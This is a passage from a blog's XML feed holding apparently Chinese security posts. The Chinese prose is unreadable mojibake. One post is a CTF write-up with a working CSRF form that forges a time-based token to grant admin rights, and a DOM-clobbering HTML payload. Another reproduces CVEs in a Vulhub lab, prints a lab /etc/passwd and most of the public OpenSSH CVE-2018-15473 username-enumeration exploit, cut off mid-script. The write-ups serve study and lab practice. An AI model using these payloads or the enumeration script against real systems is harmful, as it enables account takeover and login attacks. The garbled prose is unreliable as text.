è¾“çš„æ•°æ®ï¼Œè¿›è¡ŒTLSå¤ç”¨ï¼Œæ•°æ®è¢«æ³¨å…¥</p><p><del>åé¢å°±æ˜¯èµ›åå¤ç›˜çš„äº†</del></p><h2 id="beWhatYouWannaBe"><a href="#beWhatYouWannaBe" class="headerlink" title="beWhatYouWannaBe"></a>beWhatYouWannaBe</h2><p>é¦–å…ˆP1é€šè¿‡CSRFè·å–adminï¼Œå¹¶ä¸”æ­¤å¤„çš„Tokenå€¼å¯è®¡ç®—</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">ValidateToken</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">Token</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> sha256 <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">createHash</span><span class="token punctuation">(</span><span class="token string">'sha256'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> sha256<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">sin</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span> <span class="token operator">===</span> Token<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/beAdmin'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"sorry, only admin can be admin"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> username <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>username    <span class="token keyword">const</span> csrftoken <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>csrftoken    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ValidateToken</span><span class="token punctuation">(</span>csrftoken<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        User<span class="token punctuation">.</span><span class="token function">updateMany</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">username</span><span class="token operator">:</span> username <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">isAdmin</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> users</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'something error when being admin'</span><span class="token punctuation">)</span>                    <span class="token keyword">return</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>users<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'no one can be admin'</span><span class="token punctuation">)</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'wow success wow'</span><span class="token punctuation">)</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'validate error'</span><span class="token punctuation">)</span><span class="token number">3</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è·å–P1çš„jsæ„é€ å¦‚ä¸‹</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost:8000/beAdmin<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>J1an<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrftoken<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrftoken<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.jsdelivr.net/npm/crypto-js@4.0.0/crypto-js.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  <span class="token keyword">var</span> a<span class="token operator">=</span>CryptoJS<span class="token punctuation">.</span><span class="token constant">SHA256</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">sin</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> csrftoken<span class="token punctuation">.</span>value<span class="token operator">=</span>a<span class="token punctuation">;</span>  form<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å†æ¥çœ‹P2</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">setJavaScriptEnabled</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">5000</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> <span class="token constant">FLAG</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fff<span class="token punctuation">.</span>lll<span class="token punctuation">.</span>aaa<span class="token punctuation">.</span>ggg<span class="token punctuation">.</span>value <span class="token operator">==</span> <span class="token string">"this_is_what_i_want"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">fetch</span><span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">'?part2='</span> <span class="token operator">+</span> <span class="token function">btoa</span><span class="token punctuation">(</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span><span class="token constant">FLAG</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">fetch</span><span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">'?there_is_no_flag'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> <span class="token constant">FLAG</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¯´ç™½äº†å°±æ˜¯æ„é€ ä¸€ä¸ªhtmlä½¿å¾—<code>fff.lll.aaa.ggg.value == &quot;this_is_what_i_want&quot;</code>ï¼Œä½¿ç”¨<a href="https://portswigger.net/research/dom-clobbering-strikes-back">è¿™ä¸ª</a>å°trickæ¥åµŒå¥—æ„é€ å…ƒç´ ï¼Œæœ€ç»ˆä¸¤è€…æ‹¼æ¥æ„é€ å‡ºçš„htmlå¦‚ä¸‹</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>fff</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;form id=lll name=aaa>&lt;input name=ggg value=this_is_what_i_want>&lt;/form>&lt;form id=lll>&lt;/form><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost:8000/beAdmin<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>J1an<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrftoken<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrftoken<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.jsdelivr.net/npm/crypto-js@4.0.0/crypto-js.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  <span class="token keyword">var</span> a<span class="token operator">=</span>CryptoJS<span class="token punctuation">.</span><span class="token constant">SHA256</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">sin</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> csrftoken<span class="token punctuation">.</span>value<span class="token operator">=</span>a<span class="token punctuation">;</span>  form<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="poorui"><a href="#poorui" class="headerlink" title="poorui"></a>poorui</h2><p>åŸºæœ¬å…¨æ˜¯éé¢„æœŸå§ï¼Œç™»å½•flagå»æ‰¾flagbotè¦å°±è¡Œäº†ss</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaScriptä¸Nodejs</title>
      <link href="/posts/8f3824ff.html"/>
      <url>/posts/8f3824ff.html</url>
      
        <content type="html"><![CDATA[<p>ä»å¤´å¼€å§‹äº†å±äºæ˜¯</p><p><strong>å˜é‡å£°æ˜</strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> x<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>forå¾ªç¯ä¸ifåˆ¤æ–­ä¸C++æ ¼å¼ç›¸åŒ</p><p><strong>å¯¹è±¡</strong></p><p><strong>BOM</strong></p><ul><li>æµè§ˆå™¨å¯¹è±¡æ¨¡å‹</li><li>javascriptå°†æµè§ˆå™¨çš„å„ä¸ªç»„æˆéƒ¨åˆ†å°è£…æˆå¯¹è±¡<ul><li>Windowï¼šæµè§ˆå™¨çª—å£å¯¹è±¡</li><li>Navigatorï¼šæµè§ˆå™¨å¯¹è±¡</li><li>Screenï¼šå±å¹•å¯¹è±¡</li><li>Historyï¼šå†å²è®°å½•å¯¹è±¡<ul><li>history.back()åé€€</li><li>history.forward()å‰è¿›</li></ul></li><li>Locationï¼šåœ°å€æ å¯¹è±¡<ul><li>location.href()è®¾ç½®æˆ–è¿”å›å®Œæ•´URL</li></ul></li></ul></li></ul><p><strong>DOM</strong></p><ul><li>æ–‡æ¡£å¯¹è±¡æ¨¡å‹</li><li>å°†æ ‡è®°è¯­è¨€çš„å„ä¸ªéƒ¨åˆ†å°è£…æˆå¯¹è±¡<ul><li>Documentï¼šæ•´ä¸ªæ–‡æ¡£å¯¹è±¡</li><li>Elementï¼šå…ƒç´ å¯¹è±¡</li><li>Attributeï¼šå±æ€§å¯¹è±¡</li><li>Textï¼šæ–‡æœ¬å¯¹è±¡</li><li>Commentï¼šæ³¨é‡Šå¯¹è±¡</li><li></li></ul></li></ul><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE</title>
      <link href="/posts/67caa546.html"/>
      <url>/posts/67caa546.html</url>
      
        <content type="html"><![CDATA[<h1 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h1><p>åœ¨Vulhubä¸Šé¢çš„CVEå¤ç°ï¼Œä¸€ä»½å°è®°å½•</p><h2 id="OpenSSH"><a href="#OpenSSH" class="headerlink" title="OpenSSH"></a>OpenSSH</h2><h3 id="CVE-2018-15473"><a href="#CVE-2018-15473" class="headerlink" title="CVE-2018-15473"></a>CVE-2018-15473</h3><p>æ¼æ´å†…å®¹ï¼šåœ¨OpenSSH 7.7å‰å­˜åœ¨ä¸€ä¸ªç”¨æˆ·åæšä¸¾æ¼æ´ï¼Œé€šè¿‡è¯¥æ¼æ´ï¼Œå¯ä»¥åˆ¤æ–­æŸä¸ªç”¨æˆ·åæ˜¯å¦å­˜åœ¨äºç›®æ ‡ä¸»æœºä¸­</p><p>æ¼æ´ä½œç”¨ï¼šæˆ‘ä»¬ç”¨å¼±å£ä»¤ã€çˆ†ç ´ç­‰æ–¹å¼è¿›è¡Œå°è¯•ç™»å½•æ—¶ï¼Œsshéœ€è¦çš„ç”¨æˆ·åå’Œè´¦æˆ·åä¸ç®¡æ˜¯ä¸€è‡´è¿˜æ˜¯ä¸ä¸€è‡´ï¼Œéƒ½ä¼šç»™æˆ‘ä»¬ä¸€ä¸ªç™»å½•å»¶è¿Ÿçš„å‡è±¡ï¼Œè®©æˆ‘ä»¬ä»¥ä¸ºå¯ä»¥ç™»å½•æˆåŠŸï¼Œå®åˆ™ä¸ç®¡ä½ çš„ç”¨æˆ·åæ˜¯å¦æ˜¯æ­£ç¡®çš„ï¼Œå®ƒéƒ½ä¼šè®©ä½ è¾“å…¥å¯†ç ï¼Œç„¶åå‘Šè¯‰ä½ ç™»å½•å¤±è´¥ï¼Œå› æ­¤æˆ‘ä»¬å¿…é¡»çŸ¥é“å¯¹æ–¹ç”¨æˆ·å‡†ç¡®çš„ç”¨æˆ·åï¼Œè®©æˆ‘ä»¬åœ¨æ¥ä¸‹æ¥ä¸ç®¡æ˜¯å¼±å£ä»¤ç™»å½•è¿˜æ˜¯æš´åŠ›ç ´è§£æ–¹é¢éƒ½å¾ˆæœ‰å¸®åŠ©</p><p>åˆ©ç”¨æ¡ä»¶ï¼šOpenSSH ç‰ˆæœ¬&lt;7.7</p><p>æ¼æ´å¤ç°ï¼š</p><ol><li><p>è¿›å…¥dockeræ›´æ”¹å¯†ç ï¼Œæ­¤å¤„æ”¹ä¸º<code>123456</code></p></li><li><p>sshè¿æ¥dockerï¼ŒæŸ¥çœ‹<code>/etc/passwd</code>æ–‡ä»¶æ¥æŸ¥çœ‹ç”¨æˆ·å</p><pre class="line-numbers language-none"><code class="language-none">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologinbin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologinsys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologinsync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;syncgames:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologinman:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologinlp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologinmail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologinnews:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologinuucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologinproxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologinwww-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologinbackup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologinlist:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologinirc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologingnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologinnobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin_apt:x:100:65534::&#x2F;nonexistent:&#x2F;bin&#x2F;falsesshd:x:74:74:Privilege-separated SSH:&#x2F;usr&#x2F;local&#x2F;sbin&#x2F;sshd:&#x2F;sbin&#x2F;nologinvulhub:x:1000:1000:,,,:&#x2F;home&#x2F;vulhub:&#x2F;bin&#x2F;bashexample:x:1001:1001:,,,:&#x2F;home&#x2F;example:&#x2F;bin&#x2F;bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>æµ‹è¯•exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># python2 exp.py --port SSHç«¯å£ --userList ç”¨æˆ·åå­—å…¸ IP</span><span class="token comment">###########################################################################</span><span class="token comment">#                ____                    _____ _____ _    _               #</span><span class="token comment">#               / __ \                  / ____/ ____| |  | |              #</span><span class="token comment">#              | |  | |_ __   ___ _ __ | (___| (___ | |__| |              #</span><span class="token comment">#              | |  | | '_ \ / _ \ '_ \ \___ \\___ \|  __  |              #</span><span class="token comment">#              | |__| | |_) |  __/ | | |____) |___) | |  | |              #</span><span class="token comment">#               \____/| .__/ \___|_| |_|_____/_____/|_|  |_|              #</span><span class="token comment">#                     | |               Username Enumeration              #</span><span class="token comment">#                     |_|                                                 #</span><span class="token comment">#                                                                         #</span><span class="token comment">###########################################################################</span><span class="token comment"># Exploit: OpenSSH Username Enumeration Exploit (CVE-2018-15473)          #</span><span class="token comment"># Vulnerability: CVE-2018-15473                                           #</span><span class="token comment"># Affected Versions: OpenSSH version &lt; 7.7                                #</span><span class="token comment"># Author: Justin Gardner, Penetration Tester @ SynerComm AssureIT         #</span><span class="token comment"># Github: https://github.com/Rhynorater/CVE-2018-15473-Exploit            #</span><span class="token comment"># Email: Justin.Gardner@SynerComm.com                                     #</span><span class="token comment"># Date: August 20, 2018                                                   #</span><span class="token comment">###########################################################################</span><span class="token keyword">import</span> argparse<span class="token keyword">import</span> logging<span class="token keyword">import</span> paramiko<span class="token keyword">import</span> multiprocessing<span class="token keyword">import</span> socket<span class="token keyword">import</span> string<span class="token keyword">import</span> sys<span class="token keyword">import</span> json<span class="token keyword">from</span> random <span class="token keyword">import</span> randint <span class="token keyword">as</span> rand<span class="token keyword">from</span> random <span class="token keyword">import</span> choice <span class="token keyword">as</span> choice<span class="token comment"># store function we will overwrite to malform the packet</span>old_parse_service_accept <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>auth_handler<span class="token punctuation">.</span>AuthHandler<span class="token punctuation">.</span>_handler_table<span class="token punctuation">[</span>paramiko<span class="token punctuation">.</span>common<span class="token punctuation">.</span>MSG_SERVICE_ACCEPT<span class="token punctuation">]</span><span class="token comment"># list to store 3 random usernames (all ascii_lowercase characters); this extra step is added to check the target</span><span class="token comment"># with these 3 random usernames (there is an almost 0 possibility that they can be real ones)</span>random_username_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment"># populate the list</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    user <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>choice<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    random_username_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token comment"># create custom exception</span><span class="token keyword">class</span> <span class="token class-name">BadUsername</span><span class="token punctuation">(</span>Exception<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token comment"># create malicious "add_boolean" function to malform packet</span><span class="token keyword">def</span> <span class="token function">add_boolean</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token comment"># create function to call when username was invalid</span><span class="token keyword">def</span> <span class="token function">call_error</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">raise</span> BadUsername<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># create the malicious function to overwrite MSG_SERVICE_ACCEPT handler</span><span class="token keyword">def</span> <span class="token function">malform_packet</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    old_add_boolean <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>message<span class="token punctuation">.</span>Message<span class="token punctuation">.</span>add_boolean    paramiko<span class="token punctuation">.</span>message<span class="token punctuation">.</span>Message<span class="token punctuation">.</span>add_boolean <span class="token operator">=</span> add_boolean    result  <span class="token operator">=</span> old_parse_service_accept<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>    <span class="token comment">#return old add_boolean function so start_client will work again</span>    paramiko<span class="token punctuation">.</span>message<span class="token punctuation">.</span>Message<span class="token punctuation">.</span>add_boolean <span 